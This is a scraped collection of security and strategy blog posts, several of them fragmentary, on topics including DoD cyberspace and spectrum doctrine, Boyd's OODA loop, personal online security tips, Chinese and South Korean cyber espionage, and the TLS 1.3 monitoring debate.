That basically summarizes what you need to know, but here's a bit more from the article:<br /><br /><i>Pentagon officials are drafting new policy that would officially recognize the electromagnetic spectrum as a “domain” of warfare, joining land, sea, air, space, and cyberspace, Breaking Defense has learned.&nbsp;</i><br /><i><br /></i><i>The designation would mark the biggest shift in Defense Department doctrine since cyberspace became a domain in 2006. With jamming, spoofing, radio, and radar all covered under the new concept, it could potentially bring new funding and clear focus to an area long afflicted by shortfalls and stovepipes.</i><br /><i><br /></i><i>The new electromagnetic spectrum domain would be separate from cyberspace, although there’s considerable overlap between the two...&nbsp;</i><br /><i><br /></i><i>But the consensus among officials and experts seems to be that the electromagnetic spectrum world — long divided between electronic warriors and spectrum managers — is so technologically complex and bureaucratically fragmented by itself it must be considered its own domain, without trying to conflate it with cyberspace.</i><br /><br />My initial reaction to this move is mixed. History and definitions provide some perspective.<br /><br />One of the big differences between the civilian and military views of ""cyberspace"" has been, prior to this story, the military's more expansive view.<br /><br />The formerly classified&nbsp;<a href=""http://nsarchive.gwu.edu/NSAEBB/NSAEBB424/docs/Cyber-023.pdf"">National Military Strategy for Cyberspace Operations</a>, published in 2006, defined cyberspace as<br /><br /><i>A domain characterized by the use of electronics&nbsp;<b>and the electromagnetic spectrum&nbsp;</b>to store, modify, and exchange data via networked systems and associated physical infrastructures.</i>&nbsp;(emphasis added)<br /><br />The NMS-CO in a sense embedded cyberspace within EMS. That document also signaled DoD's formal recognition of cyberspace as a domain. By associating EMS with cyberspace, DoD thought of cyberspace in larger terms than civilian counterparts. In addition to activities involving computers, now cyberspace theoretically incorporated electronic warfare and other purely military functions with little or no relationship with civilian activities.<br /><br /><a href=""http://armypubs.army.mil/doctrine/DR_pubs/dr_a/pdf/adrp3_0.pdf"">Army Doctrine Reference Publication No. 3-0</a> published in 2012 introduced the term ""cyber electromagnetic activities"" (CEMA). It defined CEMA as<br /><br /><i>Activities leveraged to&nbsp;</i><i>seize, retain, and exploit an&nbsp;</i><i>advantage over adversaries and enemies in both&nbsp;</i><br /><i>cyberspace and the <b>electroma</b></i><i><b>gnetic spectrum</b>, while&nbsp;</i><i>simultaneously denying and degrading adversary and enemy use of the same and protecting the&nbsp;</i><i>mission command system.</i><i>&nbsp;Cyber electromagnetic activities consist&nbsp;</i><i>of cyberspace operations, electronic&nbsp;</i><i>warfare, and electromagnetic spectrum operations.</i><br /><i><br /></i>This Army publication separates cyberspace and EMS, and created ""CEMA"" as an umbrella over both.<br /><i><br /></i>The more recent &nbsp;<a href=""http://www.dtic.mil/doctrine/new_pubs/jp3_12R.pdf"">Joint Publication 3-12R</a>, published in 2013, drops explicit mention of the EM spectrum. It defines cyberspace as<br /><br /><i>A global domain within the info</i><i>rmation environment consisting of the&nbsp;</i><i>interdependent networks of information t</i><i>echnology infrastructures and resident data,&nbsp;</i><i>including the Internet, telecommunications networks, computer systems, and embedded&nbsp;</i><i>processors and controllers</i><i>.</i><br /><i><br /></i>With the definitions and their evolution out of the way, consider what it means for cyberspace to be separate from EMS.<br /><br />In my opinion, <b>cyberspace has always been more about the content</b>, and less the infrastructure. In other words, it's the information that matters, not necessarily the containers. I first appreciated this distinction when I was stationed at Air Intelligence Agency, where we helped publish <a href=""http://www.globalsecurity.org/military/library/policy/usaf/afdd/2-5/afdd2-5.pdf"">Air Force Doctrine Document 2-5: Information Operations</a> in August 1998. Page 3 states<br /><br /><i>The Air Force believes information operations include actions taken to&nbsp;</i><i><b>gain, exploit, defend, or attack [GEDA] information and information systems</b>. </i>(emphasis added)<br /><br />*Note that document doesn't use the term ""cyber"" very much. When describing information warfare, it states<br /><br /><i>Information warfare involves such diverse activities as psychological operations, military deception, electronic warfare, both physical and information (“cyber”) attack, and a variety of defensive activities and programs.</i><br /><br />In any case, the ""GEDA"" concept stuck with me all these years. I think the focus on the information, rather than the infrastructure, is conceptually useful. Consider: would there be ""cyberspace"" if it contained no information? The answer might be yes, but would anyone care to use it? It's the information that makes ""cyberspace"" what it is, I believe.<br /><br />In this sense, separating the physical aspect of EMS seems to make sense. However, what does that mean for other physical aspects of manipulating information? EMS seems most tangible when considering radio and other radio frequency (RF) topics. How does that concept apply to cables or servers or other devices? Are they part of EMS? Do they ""stay"" with ""cyberspace""?<br /><br />Finally, I am a little worried that a reason from creating EMS as a sixth domain could be because it is ""&nbsp;technologically complex and bureaucratically fragmented,"" as described in the article excerpt. ""Creating"" a military domain should not be done to solve problems of complexity or bureaucracy. Domains should be used as constructs to improve the clarity of thinking around warfighting, at least in the military world.<br /><br />Addendum: When reading <a href=""http://www.dtic.mil/doctrine/new_pubs/jp3_13.pdf"">Joint Publication 3-13: Information Operations</a> for this post, I saw the following figure:<br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""http://4.bp.blogspot.com/-zRyJGbXfXJ4/VmmaFCK5oWI/AAAAAAAAN0M/D5VdSTbzG7o/s1600/io.jpg"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""640"" src=""http://4.bp.blogspot.com/-zRyJGbXfXJ4/VmmaFCK5oWI/AAAAAAAAN0M/D5VdSTbzG7o/s640/io.jpg"" width=""588"" /></a></div><div class=""separator"" style=""clear: both; text-align: center;""><br /></div><div class=""separator"" style=""clear: both; text-align: left;"">It is one way to show that DoD considers Information Operations to be a much larger concept than you might consider.

Boyd OODA Looping Is More Than Speed,TaoSecurity,"<div class=""separator"" style=""clear: both; text-align: center;""><a href=""http://4.bp.blogspot.com/-msw22HnscFM/VmLpy-XiLwI/AAAAAAAANxQ/mNZ-GmDnXsw/s1600/Boyd-1.jpg"" style=""clear: left; float: left; margin-bottom: 1em; margin-right: 1em;""><img border=""0"" src=""http://4.bp.blogspot.com/-msw22HnscFM/VmLpy-XiLwI/AAAAAAAANxQ/mNZ-GmDnXsw/s1600/Boyd-1.jpg"" /></a></div>The name ""John Boyd"" and the term ""OODA Loop"" are probably familiar to many of the readers of this blog. I've mentioned one or the other in <a href=""http://taosecurity.blogspot.com/2006/02/rsa-conference-2006-wrap-up-part-1-im.html"">2006</a>, <a href=""http://taosecurity.blogspot.com/2007/10/air-force-cyberspace-report.html"">2007</a>, <span id=""goog_1306027777""></span><a href=""http://taosecurity.blogspot.com/2009/08/build-visibility-in.html"">2009</a> <span id=""goog_1306027778""></span>(<a href=""http://taosecurity.blogspot.com/2009/08/attack-models-in-physical-world.html"">twice</a>), and <a href=""http://taosecurity.blogspot.com/2014/09/a-brief-history-of-network-security.html"">2014</a>. Boyd was a fighter pilot in the Korean war and revolutionized thinking on topics like fighter design and military strategy. His OODA loop -- an acronym for Observe, Orient, Decide, Act -- is the contribution that escaped from the military sphere into other fields of thought. In a world that has finally realized <a href=""http://taosecurity.blogspot.com/2006/02/bears-teach-network-security.html"">prevention eventually fails</a>, the need for a different strategy is being appreciated.<br /><br />I've noticed an increasing number of vendors invoke Boyd and his OODA loop as an answer. Unfortunately, they fixate on the idea of ""speed."" They believe that victory over an adversary results from operating one's OODA loop faster than an opponent. In short, if we do something faster than the adversary, we win and they lose. While there is some value to this approach, it is not representative of Boyd's thought and misses key elements of his contribution.<br /><br />Before continuing I'd like to mention a recent talk on OODA within the security community that didn't fall into the ""speed rules"" trap. At the last Security Onion conference, Martin Holste presented <a href=""https://prezi.com/qzar9ip-zlvt/security-event-data-in-the-ooda-loop-model/"">Security Event Data in the OODA Loop Model</a>. His spoken remarks reflected the issues I raise in this post, and for a hint in his Prezi material you see statements like ""At higher levels, OODA speed is less important than accurate mental models."" I was glad to see Martin avoid the speed trap in his talk!<br /><br />The best reference for gaining a deep appreciation for Boyd's strategic thought is the book <a href=""http://www.amazon.com/Science-Strategy-War-Strategic-History/dp/0415459524"">Science, Strategy and War: The Strategic Theory of John Boyd</a> by Frans P.B. Osinga. I have the Kindle and paperback editions. The Kindle version is readable, but you may have trouble with some of the tables and figures.<br /><br />The following is a selection of quotes from the book, re-ordered, highlighted, and lightly edited to capture the author's message on properly appreciating Boyd and OODA.<br /><br /><a href=""http://3.bp.blogspot.com/-Mm3KRJ5EtXU/VmLtoWdxW3I/AAAAAAAANxc/hStwgD5X0xk/s1600/scistratwar.jpg"" style=""clear: right; float: right; margin-bottom: 1em; margin-left: 1em;""><img border=""0"" height=""200"" src=""http://3.bp.blogspot.com/-Mm3KRJ5EtXU/VmLtoWdxW3I/AAAAAAAANxc/hStwgD5X0xk/s200/scistratwar.jpg"" width=""125"" /></a><i>[T]he common view that the OODA loop model, interpreted as an argument that victory goes to the side that can decide most efficiently, falls short of the mark in capturing the meaning and breadth of Boyd’s work...</i><br /><i><br /></i><i>The first misconception about the OODA loop concerns the element of speed. The rapid OODA looping idea suggests a focus on speed of decision making, and ‘out-looping’ the opponent by going through consecutive OODA cycles faster. This is not incorrect, indeed, Boyd frequently suggested as much, [however]...</i><br /><i><br /></i><i>Whereas rapid OODA looping is often equated with superior speed in decision making, Boyd employs the OODA loop model to show how organisms <b>evolve and adapt</b>.</i><br /><i><br /></i><i><b>[U]ncertainty as the key problem</b>&nbsp;organisms and organizations have to surmount...</i><br /><div><br /></div><i>One may react very fast to unfolding events, but if one is constantly surprised nevertheless, apparently one has not been able to turn the findings of repeated observations and actions into a better appreciation of the opponent, i.e. <b>one has not learned </b>but instead has <b>continued to operate on existing orientation patterns</b>...</i><br /><i><br /></i><i>[T]he abstract aim of Boyd’s method is to <b>render the enemy powerless</b> by denying him the time to mentally cope with the rapidly unfolding, and naturally <b>uncertain</b>, circumstances of war, and only in the most simplified way, or at the tactical level, can this be equated with the narrow, rapid OODA loop idea...</i><br /><i><br /></i><i>This points to the major overarching theme throughout Boyd’s work: the capability to <b>evolve, to adapt, to learn, and deny such capability to the enemy</b>...</i><br /><i><br /></i><i><b>It is not absolute speed that counts</b>; it is the <b>relative</b> tempo or a <b>variety</b> in rhythm that counts. Changing OODA speed becomes part of <b>denying a pattern</b> to be recognized...</i><br /><i><br /></i><i>The way to play the game of interaction and isolation is [for our side] to spontaneously generate <b>new mental images</b> that match up with an unfolding world of uncertainty and change...</i><br /><i><br /></i><i>In order to avoid predictability and ensuring adaptability to a variety of challenges, it is essential [for our side] to have a <b>repertoire of orientation patterns</b> and the ability to select the correct one according to the situation at hand while denying the opponent the latter capability...</i><br /><i><br /></i><i>[In Boyd's words, one should] ""operate inside [an] adversary’s observation-orientation-decision-action loops to enmesh [the] adversary in a world of <b>uncertainty</b>, doubt, mistrust, confusion, disorder, fear, panic, chaos . . . and/or fold adversary back inside himself so that he cannot cope with events/efforts as they unfold...</i><br /><i><br /></i><i>[We should ask ourselves] <b>how do we want our posture to appear to an adversary</b>, i.e., what kind of mental picture do we want to generate in his mind?</i><br /><i><br /></i><i>Designing one’s defense on this basis is obviously quite a departure [from current methods].</i><br /><br /><a href=""http://1.bp.blogspot.com/-QB8tsD65lFs/VmLzdy0NhBI/AAAAAAAANx0/WxitXijQQIg/s1600/boydpoc.jpg"" style=""clear: left; float: left; margin-bottom: 1em; margin-right: 1em;""><img border=""0"" src=""http://1.bp.blogspot.com/-QB8tsD65lFs/VmLzdy0NhBI/AAAAAAAANx0/WxitXijQQIg/s1600/boydpoc.jpg"" /></a>My take on these points is the following: Boyd's OODA loop is more about affecting the adversary than it is about one's own operations. Our side should take actions to target the adversary's OODA loop such that his cycle becomes slower than ours, due to the adversary's difficulty in properly matching his mental images of the world with what is actually happening in the world. On our side, we want to be flexible and nurture a variety of mental images that better match what is happening in the world, which will enable more efficient OODA loops.<br /><br />In brief, the OODA concept has a speed component, but it is much more about coping with perceptions of reality, on the part of the adversary and ourselves. This approach can be used offensively and defensively.<br /><br />What might this look like in the security world? That is worth one or more future posts.<br /><br />If you'd like to learn more, in addition to Osinga's book I recommend reading&nbsp;<a href=""http://www.amazon.com/gp/product/0316796883/"">Boyd: The Fighter Pilot Who Changed the Art of War</a> by Robert Coram and listening to the Pattern of Conflict videos on <a href=""https://www.youtube.com/user/Jasonmbro/videos"">YouTube</a>. All 14 parts occupy about 6 1/2 hours. I recommend extracting them to audio format and listening to them on a long drive or flight. I listened to them driving to and from the aforementioned Security Onion conference. There is really no substitute to listening to the master at work. It brings the books to life when you have Boyd's voice and mannerisms playing in your mind.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2015/12/boyd-ooda-looping-is-more-than-speed.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

I realized some small businesses are in some ways indistinguishable from individuals, such that advice for personal online security would be more appropriate for some small businesses. In other words, some businesses are scaled such that one or a few people are the entire business. In that spirit, I offer the following suggestions for individuals and these small businesses.<br /><br /><b>1. Protect your email.</b> Email is the number one resource most of us possess, for three reasons. First, imagine that you forget your password to just about any Web site. How do you recover it? It's likely you request a password reset, and you get an email. Now, if you no longer control your email, an attacker can reset your passwords and take control of your Web accounts. How does an attacker know what accounts you own? That is answered by the second key to email: content. A quick check of your emails will reveal the organizations with which you do business. The content can also provide means to access other accounts. The third reason email is so critical is that it is essentially your online identity. An attacker can use your email to impersonate you and try to gain access to those that trust you.<br /><br />So, how should you protect your email? I offer four recommendations. First, select a provider who gives you plenty of insight into how your account is used. Would you get an alert when someone logs into your account from a foreign country, for example? Second, select a provider who offers two-factor authentication. This means you can choose to log in with more than just a username and password. Third, select a provider who has experience with confronting and defeating intruders, and who takes actions to continuously improve their security. For consumers, I prefer Gmail. Of course, I am not of fan of being monetized by Alphabet and Google, but the trade-off is worth it for most of us.<br /><br />My last recommendation is to limit what you store in email. Don't transmit or store sensitive information, like your personally identifiable information (Social Security number, etc.), in your email. As a thought experiment, imagine what it would look like to have your email published online. What would be the consequences? Try to address those concerns by removing such content from your email.<br /><br /><b>2. If you don't need it, delete it.</b>&nbsp;This general rule applies to applications and data. If you don't need Java or Flash or other applications on your PC, phone, or tablet, remove them. The less software on your device, the better. For data, be judicious about what you store in digital form. Anything stored on a device or in the cloud can be read, copied, changed, or deleted by an attacker. My post&nbsp;<a href=""http://www.brookings.edu/blogs/techtank/posts/2015/09/03-bejtlich-black-hat-cybersecurity-conference"">“If you can’t protect it, don’t collect it”</a> offers more on this topic.<br /><br /><b>3. Patch the software you keep. </b>If you use Windows, run a modern version such as Windows 7 or newer, and install patches regularly, for the operating system and applications. On Windows it can be tough to identify just what needs to be updated. A free tool that can help is <a href=""http://www.kcsoftwares.com/?sumo"">SUMo</a>, the Software Update Monitor. Download the ""lite"" version and run it to see what needs to be updated. Pay attention to applications from Adobe, like Flash, Reader, and such. Remember tip 2!<br /><br /><b>4. Run a modern Web browser.</b>&nbsp;For general consumers, the best Web browser in my opinion is <a href=""https://www.google.com/chrome/browser/desktop/index.html"">Google Chrome</a>. Make sure it is set to auto-update so you are running the latest version. Install an ad-blocker like <a href=""https://adblockplus.org/en/"">Adblock Plus</a>.<br /><br /><b>5. Back up your data.</b>&nbsp;Research and implement a way to back up the data on your devices. This can be a complicated issue. For example, you may keep sensitive data on your laptop or PC, and you fear putting it in the cloud. One way to address that concern is to store that data in encrypted form on your laptop or PC, such that when it is stored in the cloud it is also encrypted.<br /><br />Some may argue that certain cloud providers will encrypt your data for you, so why encrypt it locally first? My answer: if an attacker gains access to your cloud backup username and password, he can access your cloud backup provider and download your data, regardless of whether the cloud provider encrypts it or not. If the attacker finds your most sensitive data encrypted within the cloud backup, that means he needs to beat the encryption you applied on your own. Like all the measures in this post, nothing is foolproof. However, introducing challenges to the adversary is the key to security.<br /><br />Furthermore, don't confuse cloud storage with backup. If you store data in Google Drive, or other locations, don't consider that a backup. I recommend adding a real backup provider to your configuration. <br /><br />On a related note, enable full-device encryption on devices you are likely to lose. This applies most likely to your phone and tablet. The danger you are trying to mitigate here is physical loss or theft of your device. Be sure you enable a numeric pin such that a thief can't simply log into your lost or stolen device. I am also a fan of services that let you remotely locate your lost or stolen device, such that you can either find them or wipe them at a distance.<br /><br /><b>6. Buy Apple phones and tablets and keep them up-to-date.</b>&nbsp;This looks like a blatant advertisement for Apple, but I promise you I am not an Apple fan boy. The fact of the matter is that Apple iPhones and iPads, when running the latest versions of the iOS software, provide the best combination of features and security available to the general consumer. They are easiest to operate and to update. Updating iOS and the installed apps is exceptionally easy. Furthermore, the best metric we have regarding software security shows that exploits for iOS devices <a href=""http://www.wired.com/2015/11/heres-a-spy-firms-price-list-for-secret-hacker-techniques/"">cost far more</a> than other software or platforms. This means it is tougher for intruders to break into devices running iOS.<br /><br /><b>7. Consider a password manager, but not for every Web site.</b>&nbsp;Nothing is (or should be) absolute in security. Password managers are applications that assist users with storing, supplying, and even generating usernames and passwords for Web sites and other applications. They are an improvement over using the same username and password at multiple Web sites. However, when using a password manager, you run the risk of a flaw in that manager being used by an attacker to access your username and passwords! It sounds like a tough situation, but in general the benefits of the password manager outweigh the risks. If you choose a password manager, select one that offers two factor authentication, such that accessing your usernames and passwords requires you to enter a numeric code. Also, don't put your most sensitive accounts in the manager. For example, in deference to point 1, don't store your email username and password in the manager.<br /><br /><b>Bonus: Be vigilant.</b>&nbsp;Wherever you can introduce alerts about how your accounts and data are being used, enable them. For example, does your credit card offer the option to email you when a purchase is made? Perhaps you only care about overseas purchases, or purchases above a certain amount, or at gas stations. The point is to put your service providers to work for you, such that they give you information that informs your security posture. If you learn of a suspicious event and react in time, you can potentially limit or eliminate the damage through swift personal response.<br /><br />There are many other considerations for individuals, especially with respect to resisting targeted attacks. I didn't address resisting social engineering, phishing, and the like, but I believe that is well-covered elsewhere. To counter the general opportunistic attacker, these are the steps I would recommend to individuals and small businesses.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2015/11/seven-tips-for-personal-online-security.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

The correspondent was David Martin, whose biography includes the fact that he served as a naval officer during the Vietnam War. The piece concluded with the following exchange and commentary:<br /><br /><i>On the day we watched the B-1 strike, that same bomber was sent to check out a report of a single ISIS sniper firing from the top of a building.</i><br /><i><br /></i><i>Weapons officer: The weapon will time out directly in between the two buildings.</i><br /><i><br /></i><i>This captain was one of the weapons officers in the cockpit.</i><br /><i><br /></i><i>David Martin: B-1 bomber.</i><br /><i><br /></i><i>Weapons officer: Yes sir.</i><br /><i><br /></i><i>David Martin: All that technology.</i><br /><i><br /></i><i>Weapons officer: Yes sir.</i><br /><i><br /></i><i>David Martin: All that fire power. One sniper down on the ground.</i><br /><br />I thought the captain's next words were right on target:<br /><br /><i>Weapons officer: Sir, I think if it was you or me on the ground getting shot at by that sniper we would take any asset available to make sure we were no longer getting, you know, engaged by that sniper. So, if I get a call and they say they're getting shot at, and there's potential loss of friendly life, I am absolutely gonna drop a weapon on that sniper.</i><br /><br />It's clear that Mr Martin was channeling the Vietnam experience of heavily trained pilots flying multi-million dollar airplanes, dropping millions of dollars of bombs on the&nbsp;Ho Chi Minh trail, trying to stop porters carrying supplies on their backs and on bicycles. I understand that concern and I share that theme. However, I'd like to offer another interpretation.<br /><br />The ability to dynamically retask in-air assets is a strength of American airpower. This episode involved retasking a B-1 that had already completed its primary mission. By putting that asset to use again, it alleviated the need to launch another aircraft.<br /><br />However:<br /><br /><i>By the time the B-1 arrived overhead the sniper was gone.</i><br /><i><br /></i><i>Weapons officer: What we did, however, find though was a tunnel system. So, in this case we dropped weapons on all the entry points that were associated with that tunnel.</i><br /><i><br /></i><i>Six 500-pound bombs.</i><br /><i><br /></i><i>Weapons officer: It was actually a perfect shack on the target.</i><br /><br />This could be interpreted as a failure, because the sniper wasn't killed. However, in another example of retasking and dynamic intelligence, the B-1 was able to destroy a tunnel system. This again prevented the launch of another aircraft to accomplish that new mission.<br /><br />These are features of the 60 Minutes story that were not conveyed by the on-air narrative, but which I observed based on my Air Force experience.

I recommend reading that article to get my full take on the importance of this language, including the bold elements.<br /><br />It's likely many readers don't think of South Korea as an economic threat to the US. While South Korean operations are conducted at a fraction of the scale of their Chinese neighbors, ROK spies still remain busy. In January Shane Harris wrote a great story titled&nbsp;<a href=""http://www.thedailybeast.com/articles/2015/01/21/the-other-korea-is-hacking-us-and-we-don-t-seem-to-care.html"">Our South Korean Allies Also Hack the U.S.—and We Don’t Seem to Care</a>. It contains gems like the following:<br /><br /><i>From 2007 to 2012, the Justice Department brought charges in at least five major cases involving South Korean corporate espionage against American companies. Among the accused was a leading South Korean manufacturer that engaged in what prosecutors described as a “multi-year campaign” to steal the secret to DuPont’s Kevlar, which is used to make bulletproof vests...</i><br /><i><br /></i><i>All of the cases involved corporate employees, not government officials, but the technologies that were stolen had obvious military applications. South Korean corporate spies have targeted thermal imaging devices and prisms used for guidance systems on drones...</i><br /><i><br /></i><i>But South Korea has gone after commercial tech, as well. A 2005 report published by Cambridge University Press identified South Korea as one of five countries, along with China and Russia, that had devoted “the most resources to stealing Silicon Valley technology.”</i><br /><br />I commend the administration for securing a ""cyber theft pledge"" from another country. Whether it will hold is another issue. Just today there is reporting claiming that China is still targeting US companies in order to benefit Chinese companies. I believe it is too soon to make a judgment.<br /><br />I'm also watching to see which countries besides the US approach China, asking for similar ""cyber theft pledges."" With President Xi visiting the UK soon, will we see Prime Minister Cameron ask that China stop stealing commercial secrets from UK companies?<br /><br />On a related note, I've encountered several people recently who were not aware of the excellent annual Targeting US Technologies report series by the US Defense Security Service. They are posted <a href=""http://www.dss.mil/ci/ci_reports.html"">here</a>.

I was frustrated with the Western-centric, inward-focused view of many commentators, which put themselves at the center of debates over digital conflict, neglecting the possibility that other parties could perceive the situation differently. I remain concerned that while Western thinkers debate war using Western, especially Clausewitzian, models, Eastern adversaries, including hybrid Eastern-Western cultures, perceive war in their own terms.<br /><br />I wrote in June 2011:<br /><br /><i>The Chinese military sees Western culture, particularly American culture, as an <b>assault on China</b>, saying ""the West uses a system of values (democracy, freedom, human rights, etc.) in a <b>long-term attack on socialist countries</b>...</i><br /><i><br /></i><i>Marxist theory opposes peaceful evolution, which... is the basic Western tactic for subverting socialist countries"" (pp 102-3). They believe the <b>US is conducting psychological warfare operations against socialism</b> and consider culture as a ""frontier"" that has extended beyond American shores into the Chinese mainland.</i><br /><i><br /></i><i>The Chinese therefore consider control of information to be paramount, since they do not trust their population to ""correctly"" interpret American messaging (hence the ""Great Firewall of China""). In this sense, China may consider the <b>US as the aggressor in an ongoing cyberwar</b>.</i><br /><br />Today thanks to a Tweet by Jennifer McArdle I noticed a May 2015 story featuring a translation of a People's Daily article. The English translation is posted as <a href=""https://chinacopyrightandmedia.wordpress.com/2015/05/20/cybersovereignty-symbolizes-national-sovereignty/"">Cybersovereignty Symbolizes National Sovereignty</a>.<br /><br />I recommend reading the whole article, but the following captures the spirit of the message:<br /><br /><i><b>Western hostile forces</b> and a small number of “ideological traitors” in our country <b>use the network</b>, and <b>relying on computers,</b> mobile phones and other such information terminals, <b>maliciously attack</b> our Party, blacken the leaders who founded the New China, vilify our heroes, and arouse mistaken thinking trends of historical nihilism, with the ultimate goal of <b>using “universal values” to mislead us</b>, using “constitutional democracy” to throw us into turmoil, <b>use “colour revolutions” to overthrow us</b>, use negative public opinion and rumours to oppose us, and use “de-partification and depoliticization of the military” to upset us.</i><br /><br />This article demonstrates that, four years after my first post, there are still elements, at least in the PLA, who believe that China is fighting a cyber war, and that the US started it.<br /><br />I thought the last line from the PLA Daily article was especially revealing:<br /><br /><i>Only if we act as we did at the time of the <b>Battle of Triangle Hill</b>, are riveted to the most forward position of the battlefield and the fight in this ideological struggle, are online “seed machines and propaganda teams”, and arouse hundreds and thousands in the “Red Army”, will we be able to be good shock troops and fresh troops in the <b>construction of the “Online Great Wall”</b>, and will we be able to <b>endure and vanquish</b> in this<b> protracted, smokeless war</b>.</i><br /><br />The <a href=""https://en.wikipedia.org/wiki/Battle_of_Triangle_Hill"">Battle of Triangle Hill</a> was an engagement during the Korean War, with Chinese forces fighting American, South Korean, Ethiopian, and Colombian forces. Both sides suffered heavy losses over a protracted engagement, although the Chinese appear to have lost more and viewed their attrition strategy as worthwhile. It's ominous this PLA editorial writer decided to cite a battle between US and Chinese forces to communicate his point about online conflict, but it should make it easier for American readers to grasp the seriousness of the issue in Chinese minds.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2015/10/for-pla-cyber-war-is-battle-of-triangle.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."
2017-08-25 07:03:00+08:00,"The TLS 1.3 Controversy, and Why We Need to Choose Stronger Security",Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>Transport Layer Security (TLS) is fundamental to the security of the Internet. Proposed changes to the protocol are generating extensive controversy within and outside the security industry. Rather than getting into cryptographic specifics, this post focuses on the root of the controversy, and why we believe TLS 1.3 should proceed with the full support of technical professionals.</p>

<p><strong>What is TLS 1.3?</strong> &#8211; <em>Transport Layer Security (TLS)</em> is the primary protocol for securely sending information over the Internet. It is the successor to <em>SSL (Secure Sockets Layer)</em> and built into every web browser and web server, as well as many other applications. Nearly every website in the world uses TLS to one degree or another to protect communications &#8211; including signing into a site with a password, banking, and reading email. TLS is also embedded into many other applications and the guts of the Internet. You use it every day. If you are reading this on our website you used TLS to see this page. If you checked your email today, TLS is what prevented someone on the Internet from reading it.</p>

<p>If you are completely non-technical, think of it as a security envelope for your data. But TLS does much more.</p>

<p>TLS 1.3 is a proposed draft to update the current version (TLS 1.2 &#8211; surprise!) and improve security and performance. As with any software, TLS is never &#8216;perfect&#8217;, and needs updating from time to time. For example one change cuts the window to initiate a secure connection in half. 1.3 also simplifies the kinds of encryption it supports to eliminate known security vulnerabilities. TLS 1.3 is already supported in some web browsers, even though the standard isn&#8217;t final.</p>

<p><strong>Why is TLS 1.3 controversial?</strong> &#8211; Version 1.3 eliminates a security weakness of TLS 1.2, but that exact weakness is used by many organizations to monitor their networks. Some organizations and security vendors want to retain it so they can continue to use existing technique to monitor traffic.</p>

<p>We need to choose between better inherent Internet security and supporting a widely used monitoring technique.</p>

<p>Monitoring itself is not inherently <em>bad</em>. Common tools like <em>Data Loss Prevention</em> rely on peering into encrypted connections on corporate networks to identify sensitive data being accidentally or maliciously exposed. Other tools sniff connections to recognize attacker activity, and then either block or alert. It&#8217;s a form of wiretapping, but one widely used as part of security programs rather than for spying &#8211; although it can obviously be used for both.</p>

<p>Security is always a balancing act, so we often face these difficult decisions. Fortunately in this case there are alternative techniques to achieve the same security goals, so our position is that we should not keep a vulnerability in a core Internet protocol just to support existing security tools.</p>

<p>The controversy is about security vs. cost. Existing monitoring approaches can support 1.3, so a possibly higher implementation cost should not excuse a security reduction.</p>

<p><strong>What exactly is the security weakness TLS 1.3 eliminates?</strong> &#8211; Version 1.3 eliminates support for an older way of setting up encrypted connections using a master key. It could enable someone with a copy of the master key to sniff all encrypted traffic. They could also decrypt any previously recorded traffic protected with that key. The proposed updates to TLS use a different key for every connection, so there is no master key which could allow unrestricted monitoring. We call this <em>Perfect Forward Secrecy</em>, if you want to look it up.</p>

<p>This is a pretty big weakness, which <em>has</em> been used in attacks. Unfortunately it&#8217;s also used by legitimate security tools for more efficient monitoring.</p>

<p><strong>Does TLS 1.3 reduce enterprise and government security?</strong> &#8211; No.</p>

<p>It <em>changes</em> how you need to implement some security. It <em>will</em> cost money to update to new kinds of systems to perform the same kinds of monitoring. It will require rethinking how we do some things today. But it does not eliminate the ability to achieve security objectives.</p>

<p>Organizations that need to monitor traffic can do so with four techniques:</p>

<ul>
<li>Active interception (man in the middle) techniques.</li>
<li>Using software to capture traffic on endpoint systems, instead of on the network.</li>
<li>Capturing data on Internet servers. For example, some cloud services allow you to track all employee data and activity.</li>
<li>For servers you control, you can still use TLS 1.2. It will likely be supported for <strong>many</strong> years.</li>
</ul>

<p><strong>Do we really need to remove passive monitoring from TLS 1.2?</strong> &#8211; Yes.</p>

<p>We face a simple choice: we can make network sniffing attacks harder, or easier. We can improve security, or leave a known vulnerability. Our position is that we should <strong>always</strong> choose stronger security. The Internet is littered with the consequences of choosing weaker options, especially for encryption.</p>

<p>Support for passive monitoring of encrypted connections may help some aspects of an organization&#8217;s security program, but only at the expense of long-term security. Attackers, criminal and otherwise, can leverage this to spy on organizations, individuals, and governments. They can potentially record traffic on networks and then decrypt it later&#8230; even weeks, months, or years later. We have seen this exploited in criminal and government attacks &#8211; it is not a theoretical vulnerability.</p>

<p><strong>What is the impact if TLS 1.3 is adopted?</strong> &#8211; There won&#8217;t be any immediate impact in most cases.</p>

<p>TLS 1.2 is still completely supported and will be for a long time. As online services start adopting TLS 1.3, organizations which rely on passive sniffing of encrypted connections may start losing visibility into those connections. Organizations which want to maintain this visibility will need to update their tools and techniques.</p>

<p>But the entire Internet won&#8217;t shift to TLS 1.3 overnight, so there is time to make the transition.</p>

<p>Transport Layer Security 1.3 brings important security improvements to one of the most foundational technologies used to protect Internet communications. It eliminates a form of passive sniffing that, although used for legitimate security purposes, also weakens Internet communications. We would rather have an inherently secure Internet than keep a security weakness just to support existing security tools and practices which can be replaced with new techniques to achieve the same goals.</p>

<p>This is a conflict between security and cost. Sometimes costs wins, but time and time again we suffer the consequences of compromising security to reduce cost. Considering how absolutely essential TLS is to a safe and secure Internet, leaving in a known weakness to save a little money and gain convenience for a small subset of the world is simply unjustifiable.</p>

2017-08-23 01:44:00+08:00,Introducing the Endpoint Advanced Protection Buyer’s Guide,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
